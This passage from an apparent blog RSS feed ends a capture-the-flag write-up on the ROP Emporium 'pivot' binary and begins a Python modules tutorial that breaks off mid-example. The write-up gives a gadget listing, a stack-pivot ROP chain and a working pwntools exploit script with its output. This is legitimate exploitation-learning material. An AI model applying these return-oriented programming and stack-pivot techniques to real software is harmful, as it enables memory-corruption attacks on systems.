0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret;
0x0000000000400ada: call 0x840; nop; leave; ret;
0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400af5: call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400995: call qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp + 0x48&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x000000000040098e: call rax;
0x0000000000400ca3: call rsp;
0x0000000000400b5c: fmul qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7d&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x00000000004008ed: je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x000000000040093b: je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400988: je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400d9b: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x0000000000400d5b: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x0000000000400af9: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rsi + 0xf&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x00000000004008f5: jmp rax;
0x0000000000400961: lcall &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp - 0x3a&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400a34: mov eax, 0; leave; ret;
0x0000000000400b06: mov eax, dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x000000000040098c: mov ebp, esp; call rax;
0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
0x00000000004008f0: mov edi, 0x602078; jmp rax;
0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret;
0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400b05: mov rax, qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x000000000040098b: mov rbp, rsp; call rax;
0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afb: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x00000000004008f8: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
0x0000000000400945: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
0x0000000000400afa: nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x00000000004008f7: nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
0x0000000000400a2c: or eax, dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; call 0x800; mov eax, 0; leave; ret;
0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6e: pop r13; pop r14; pop r15; ret;
0x0000000000400b70: pop r14; pop r15; ret;
0x0000000000400b72: pop r15; ret;
0x0000000000400b00: pop rax; ret;
0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6f: pop rbp; pop r14; pop r15; ret;
0x0000000000400900: pop rbp; ret;
0x0000000000400b73: pop rdi; ret;
0x0000000000400b71: pop rsi; pop r15; ret;
0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
0x000000000040098a: push rbp; mov rbp, rsp; call rax;
0x0000000000400aca: ret 0x2015;
0x0000000000400987: sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b85: sub esp, 8; add rsp, 8; ret;
0x0000000000400b84: sub rsp, 8; add rsp, 8; ret;
0x00000000004008fa: test byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x00000000004008eb: test eax, eax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400939: test eax, eax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400986: test eax, eax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x00000000004008ea: test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400938: test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400985: test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400b03: xchg eax, esp; ret;
0x0000000000400b02: xchg rax, rsp; ret;
0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax;
0x0000000000400a39: leave; ret;
0x0000000000400adf: nop; leave; ret;
0x00000000004007c9: ret;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can use these gadgets:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;pop &lt;code&gt;rax&lt;/code&gt; to get &lt;code&gt;foothold_function&lt;/code&gt; got address into it: &lt;code&gt;0x0000000000400b00: pop rax; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Move the actual value, which is &lt;code&gt;foothold_function&lt;/code&gt; address into &lt;code&gt;rax&lt;/code&gt;: &lt;code&gt;0x0000000000400b05: mov rax, qword ptr [rax]; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;pop &lt;code&gt;rbp&lt;/code&gt; to get our offset (&lt;code&gt;0x14e&lt;/code&gt;) into it: &lt;code&gt;0x0000000000400900: pop rbp; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;add &lt;code&gt;rbp&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt;: &lt;code&gt;0x0000000000400b09: add rax, rbp; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;call the function: &lt;code&gt;0x000000000040098e: call rax;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After that, for our buffer overflow, we can again use the &lt;code&gt;pop rax&lt;/code&gt; gadget to get the heap address (which we get from the binary output) into it, and then swap &lt;code&gt;rsp&lt;/code&gt; and &lt;code&gt;rax&lt;/code&gt; (&lt;code&gt;0x0000000000400b02: xchg rax, rsp; ret;&lt;/code&gt;) so we&amp;rsquo;ll get our pivot - the &lt;code&gt;rsp&lt;/code&gt; will point to the heap memory!&lt;/p&gt;
&lt;h3 id=&#34;technical-chain&#34;&gt;Technical Chain&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Call &lt;code&gt;foothold_function&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load effective address of &lt;code&gt;foothold@got&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Add &lt;code&gt;0x14E&lt;/code&gt; to that register&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Return to the address in that register&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Calculate &lt;code&gt;ret2win&lt;/code&gt; address and return to it&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Stack chain:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xchg rax, rsp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rax; ret&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LEAKED HEAP ADDRESS&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Heap ROP chain:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x0000000000400850&lt;/code&gt; (foothold plt)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rax; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x000000602048&lt;/code&gt; (foothold got)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rbp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x14E&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;add rax, rbp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load effective address of &lt;code&gt;rax&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;call rax&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

ret2win_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000000abe&lt;/span&gt;
foothold_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000000970&lt;/span&gt;
add_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ret2win_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; foothold_offset
foothold_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400850&lt;/span&gt;
foothold_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000602048&lt;/span&gt;

xchg_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000400b02&lt;/span&gt;
pop_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b00&lt;/span&gt;
add_rax_rbp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b09&lt;/span&gt;
pop_rbp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400900&lt;/span&gt;
load_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b05&lt;/span&gt;
call_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000000040098e&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploit&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./pivot&amp;#34;&lt;/span&gt;)
    raw_input(str(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;proc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pid))


    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pivot: 0x&amp;#34;&lt;/span&gt;)
    addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address received: 0x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; addr)

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# stack pivot in heap&lt;/span&gt;
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(foothold_plt)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(pop_rax)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(foothold_got)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(load_rax)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(pop_rbp)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(add_offset)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(add_rax_rbp)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(call_rax)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending heap data for the stack pivot&amp;#34;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(stack_pivot)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending first bof - stack pivoting&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# stack overflow, return to stack pivot&lt;/span&gt;
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pop_rax)
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(addr)
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(xchg_rax)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; stack_chain)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&amp;#34;&lt;/span&gt;)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success( p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvall())


&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    exploit()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ python exp.py
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pivot&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;13106&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;13106&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; address received: 0x7f2367d85f10
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sending heap data &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the stack pivot
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sending first bof - stack pivoting
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Receiving all data: Done &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;33B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pivot&amp;#39;&lt;/span&gt; stopped with exit code &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pid 13106&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ROPE&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;********&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>Awesome Python modules you probably arenâ€™t using (but should be)</title>
      <link>https://adamgold.github.io/posts/awesome-python-module-you-probably-arent-using/</link>
      <pubDate>Tue, 05 Mar 2019 22:57:10 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/awesome-python-module-you-probably-arent-using/</guid>
      <description>
        
          &lt;img src=&#34;https://adamgold.github.io/img/covers/awesome-python-modules.png&#34;/&gt;
          
        
        
        &lt;p&gt;&lt;strong&gt;Python&lt;/strong&gt; is a beautiful language, and it contains many built-in modules that aim to help us write better, prettier code.&lt;/p&gt;

&lt;figure &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/posts/python_zen.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;h3 id=&#34;objective&#34;&gt;Objective&lt;/h3&gt;
&lt;p&gt;Throughout this article, we will use some lesser-known modules and methods that I think can improve the way we code - both in visibillity and in efficiency.&lt;/p&gt;
&lt;iframe
	src=&#34;https://giphy.com/embed/wHoKXCPj2NBcIoE3ZQ&#34;
	width=&#34;500&#34;
	height=&#34;400&#34;
	frameborder=&#34;0&#34;
	class=&#34;center&#34;
	allowfullscreen
&gt;&lt;/iframe&gt;

&lt;h3 id=&#34;namedtuple&#34;&gt;NamedTuple&lt;/h3&gt;
&lt;p&gt;I believe that some of you already know the more popular &lt;code&gt;namedtuple&lt;/code&gt; from the &lt;code&gt;collections&lt;/code&gt; module (if you don&amp;rsquo;t - &lt;a href=&#34;https://docs.python.org/3.6/library/collections.html#collections.namedtuple&#34;&gt;check it out&lt;/a&gt;), but since Python 3.6, a new class was added to the &lt;code&gt;typing&lt;/code&gt; module: &lt;code&gt;NamedTuple&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NamedTuple&lt;/code&gt; is actually a typed version of &lt;code&gt;NamedTuple&lt;/code&gt;, and in my opinion, it is more readable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; typing

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]: &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BetterLookingArticle&lt;/span&gt;(typing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NamedTuple):
   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     title: str
   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     id: int
   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     description: str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No description given.&amp;#34;&lt;/span&gt;
   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]: BetterLookingArticle(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Python is cool.&amp;#34;&lt;/span&gt;, id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
BetterLookingArticle(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Python is cool.&amp;#39;&lt;/span&gt;, id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;No description given.&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here&amp;rsquo;s the &lt;code&gt;namedtuple&lt;/code&gt; version:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; collections

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]: Article &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; collections&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Article&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]: Article(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Python is cool.&amp;#34;&lt;/span&gt;, id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
Article(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Python is cool.&amp;#39;&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Both classes are pretty similar and can save you and your fellow developers a lot of time trying to understand your code.&lt;/p&gt;
&lt;h3 id=&#34;arrayarray&#34;&gt;array.array&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Efficient arrays of numeric values. Arrays are sequence types and behave very much like lists, except that the type of objects stored in them is constrained. - &lt;a href=&#34;https://docs.python.org/3.6/library/array.html&#34;&gt;Python docs&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;When using the &lt;code&gt;array&lt;/code&gt; module, we need to instantiate it with a typecode, which is the type all of its elements will use. Let&amp;rsquo;s compare time efficiency with a normal list, writing many integers to a file (using &lt;a href=&#34;https://docs.python.org/3.7/library/pickle.html&#34;&gt;&lt;code&gt;pickle&lt;/code&gt;&lt;/a&gt; module for a regular list):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; array

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]: double_array &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i&amp;#34;&lt;/span&gt;, range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;))
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: start_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time()
